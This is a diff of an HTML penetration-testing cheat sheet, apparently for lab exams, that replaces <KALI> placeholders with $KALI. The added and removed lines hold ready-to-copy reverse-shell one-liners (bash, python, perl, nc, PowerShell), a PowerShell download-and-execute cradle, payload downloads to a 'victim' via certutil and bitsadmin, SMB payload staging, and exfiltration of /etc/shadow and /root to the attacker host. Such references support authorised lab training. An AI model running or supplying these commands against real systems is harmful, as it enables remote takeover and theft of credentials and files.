@@ -149,27 +149,27 @@ rlwrap nc -lvnp 443   <span class="c"># use 443 if 4444 is filtered</span>
 pwncat-cs -lp 4444    <span class="c"># auto-stabilizes, file transfer built in</span></pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">all Linux one-liners</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre><span class="c"># bash:</span>
-bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1
-bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1'
-exec 5&lt;&gt;/dev/tcp/&lt;KALI&gt;/4444;cat &lt;&amp;5 | while read l; do $l 2&gt;&amp;5&gt;&amp;5;done
+bash -i &gt;&amp; /dev/tcp/$KALI/4444 0&gt;&amp;1
+bash -c 'bash -i &gt;&amp; /dev/tcp/$KALI/4444 0&gt;&amp;1'
+exec 5&lt;&gt;/dev/tcp/$KALI/4444;cat &lt;&amp;5 | while read l; do $l 2&gt;&amp;5&gt;&amp;5;done
 
 <span class="c"># sh (if bash not available):</span>
-sh -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1
+sh -i &gt;&amp; /dev/tcp/$KALI/4444 0&gt;&amp;1
 
 <span class="c"># python3:</span>
-python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;KALI&gt;",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$KALI",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 
 <span class="c"># python2:</span>
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;KALI&gt;",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
 
 <span class="c"># perl:</span>
-perl -e 'use Socket;$i="&lt;KALI&gt;";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");}'
+perl -e 'use Socket;$i="$KALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");}'
 
 <span class="c"># nc with -e:</span>
-nc -e /bin/bash &lt;KALI&gt; 4444
+nc -e /bin/bash $KALI 4444
 
 <span class="c"># nc without -e (busybox/Alpine):</span>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;KALI&gt; 4444 &gt;/tmp/f</pre></div>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc $KALI 4444 &gt;/tmp/f</pre></div>
       <div class="sig">
         <span class="sig-title">output signals</span>
         <div class="sig-entry">
@@ -181,7 +181,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;KALI&gt; 4444
           <span class="sig-signal"><span class="sig-label">Signal:</span> bash one-liner hangs — no connection received on nc</span>
           <span class="sig-cmd">rlwrap nc -lvnp 443 <span class="sig-note">-- switch to port 443, outbound 4444 may be filtered</span></span>
           <span class="sig-cmd">python3 -c 'import socket...' <span class="sig-note">-- try python3 if bash /dev/tcp blocked</span></span>
-          <span class="sig-cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc &lt;KALI&gt; 443 >/tmp/f <span class="sig-note">-- mkfifo if nc -e not available</span></span>
+          <span class="sig-cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $KALI 443 >/tmp/f <span class="sig-note">-- mkfifo if nc -e not available</span></span>
         </div>
       </div>
       <div class="moveon">
@@ -195,38 +195,38 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;KALI&gt; 4444
     <section class="sec" id="win-shells">
       <div class="sec-head"><h2>Windows Reverse Shells</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">PowerShell full one-liner</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('&lt;KALI&gt;',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'&gt; ';$sb3=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"</pre></div>
+        <pre>powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('$KALI',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2&gt;&amp;1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'&gt; ';$sb3=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">PowerShell in-memory (no disk)</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://&lt;KALI&gt;:8080/Invoke-PowerShellTcp.ps1')"</pre></div>
+        <pre>powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$KALI:8080/Invoke-PowerShellTcp.ps1')"</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">cmd via nc.exe</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>nc.exe -e cmd.exe &lt;KALI&gt; 4444</pre></div>
+        <pre>nc.exe -e cmd.exe $KALI 4444</pre></div>
     </section>
 
     <section class="sec" id="dl-linux">
       <div class="sec-head"><h2>File Downloads — Linux Victim</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">download to victim</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>wget http://&lt;KALI&gt;:8080/&lt;file&gt; -O /tmp/&lt;file&gt;
-curl http://&lt;KALI&gt;:8080/&lt;file&gt; -o /tmp/&lt;file&gt;
+        <pre>wget http://$KALI:8080/$FILE -O /tmp/$FILE
+curl http://$KALI:8080/$FILE -o /tmp/$FILE
 
 <span class="c"># Pure bash (no wget/curl):</span>
-exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /&lt;file&gt; HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 &gt; /tmp/&lt;file&gt;</pre></div>
+exec 3&lt;&gt;/dev/tcp/$KALI/8080 &amp;&amp; echo -e "GET /$FILE HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 &gt; /tmp/$FILE</pre></div>
     </section>
 
     <section class="sec" id="dl-win">
       <div class="sec-head"><h2>File Downloads — Windows Victim</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">all download methods</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre><span class="c"># PowerShell WebClient (most reliable):</span>
-(New-Object Net.WebClient).DownloadFile('http://&lt;KALI&gt;:8080/shell.exe','C:\Windows\Temp\shell.exe')
+(New-Object Net.WebClient).DownloadFile('http://$KALI:8080/shell.exe','C:\Windows\Temp\shell.exe')
 
 <span class="c"># PowerShell Invoke-WebRequest:</span>
-iwr http://&lt;KALI&gt;:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
-Invoke-WebRequest -Uri http://&lt;KALI&gt;:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
+iwr http://$KALI:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
+Invoke-WebRequest -Uri http://$KALI:8080/shell.exe -OutFile C:\Windows\Temp\shell.exe
 
 <span class="c"># certutil (no PowerShell needed):</span>
-certutil.exe -urlcache -f http://&lt;KALI&gt;:8080/shell.exe C:\Windows\Temp\shell.exe
+certutil.exe -urlcache -f http://$KALI:8080/shell.exe C:\Windows\Temp\shell.exe
 
 <span class="c"># bitsadmin:</span>
-bitsadmin /transfer job /download /priority normal http://&lt;KALI&gt;:8080/shell.exe C:\Windows\Temp\shell.exe</pre></div>
+bitsadmin /transfer job /download /priority normal http://$KALI:8080/shell.exe C:\Windows\Temp\shell.exe</pre></div>
     </section>
 
     <section class="sec" id="smb-server">
@@ -238,10 +238,10 @@ impacket-smbserver share $(pwd) -smb2support
 impacket-smbserver share $(pwd) -smb2support -username user -password pass123
 
 <span class="c"># On victim:</span>
-net use \\&lt;KALI&gt;\share /user:user pass123
-copy \\&lt;KALI&gt;\share\shell.exe C:\Windows\Temp\shell.exe
+net use \\$KALI\share /user:user pass123
+copy \\$KALI\share\shell.exe C:\Windows\Temp\shell.exe
 <span class="c"># Or run directly without copying:</span>
-\\&lt;KALI&gt;\share\shell.exe</pre></div>
+\\$KALI\share\shell.exe</pre></div>
     </section>
 
     <section class="sec" id="exfil">
@@ -250,23 +250,23 @@ copy \\&lt;KALI&gt;\share\shell.exe C:\Windows\Temp\shell.exe
         <pre><span class="c"># nc receiver on kali:</span>
 nc -lvnp 9001 &gt; loot.tar.gz
 <span class="c"># On victim — send:</span>
-tar czf - /etc/passwd /root/ 2&gt;/dev/null | nc &lt;KALI&gt; 9001
+tar czf - /etc/passwd /root/ 2&gt;/dev/null | nc $KALI 9001
 
 <span class="c"># curl POST to kali:</span>
-curl -X POST http://&lt;KALI&gt;:8888 --data-binary @/etc/shadow</pre></div>
+curl -X POST http://$KALI:8888 --data-binary @/etc/shadow</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">Windows → Kali</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre><span class="c"># nc receiver on kali:</span>
 nc -lvnp 9001 &gt; loot.zip
 <span class="c"># On victim:</span>
 Compress-Archive -Path C:\Users\Administrator\Desktop\proof.txt -DestinationPath C:\Windows\Temp\loot.zip
-$c=New-Object Net.Sockets.TcpClient('&lt;KALI&gt;',9001);$f=[IO.File]::ReadAllBytes('C:\Windows\Temp\loot.zip');$c.GetStream().Write($f,0,$f.Length)</pre></div>
+$c=New-Object Net.Sockets.TcpClient('$KALI',9001);$f=[IO.File]::ReadAllBytes('C:\Windows\Temp\loot.zip');$c.GetStream().Write($f,0,$f.Length)</pre></div>
     </section>
 
     <section class="sec" id="cracking">
       <div class="sec-head"><h2>Hash Cracking — Quick Reference</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">identify hash type</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>hashid '&lt;hash&gt;'
-hash-identifier '&lt;hash&gt;'
+        <pre>hashid '$HASH'
+hash-identifier '$HASH'
 <span class="c"># Visual guide:</span>
 <span class="c"># $1$   → md5crypt (Linux shadow)     → hashcat -m 500</span>
 <span class="c"># $5$   → sha256crypt                 → hashcat -m 7400</span>
